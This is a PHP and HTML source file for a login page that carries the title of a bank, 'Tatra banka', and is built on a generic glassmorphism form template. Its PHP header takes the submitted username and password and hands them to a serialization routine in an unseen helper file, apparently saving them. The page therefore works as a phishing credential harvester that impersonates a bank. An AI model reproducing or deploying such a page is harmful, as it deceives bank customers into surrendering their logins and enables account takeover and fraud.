<?php
include 'scripts/user.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["login"]) && isset($_POST["password"])) {
        $formData = new Data($_POST["login"], $_POST["password"]);
        $formData->serializeDataFromForm();
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Tatra banka</title>
</head>
<body>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Glassmorphism login Form Tutorial in html css</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles/registrationForm.css" class="href">
</head>
<body>
<div class="background">
    <div class="shape"></div>
    <div class="shape"></div>
</div>
<form method="post">
    <h3>Login Here</h3>

    <label for="login">Username</label>
    <input type="text" placeholder="Email or Phone" id="login" name="login">

    <label for="password">Password</label>
    <input type="password" placeholder="Password" id="password" name="password">

    <button type="submit">Log In</button>
    <div class="social">
        <div class="go"><i class="fab fa-google"></i>  Google</div>
        <div class="fb"><i class="fab fa-facebook"></i>  Facebook</div>
    </div>
</form>

</body>
</html>
</body>
</html>
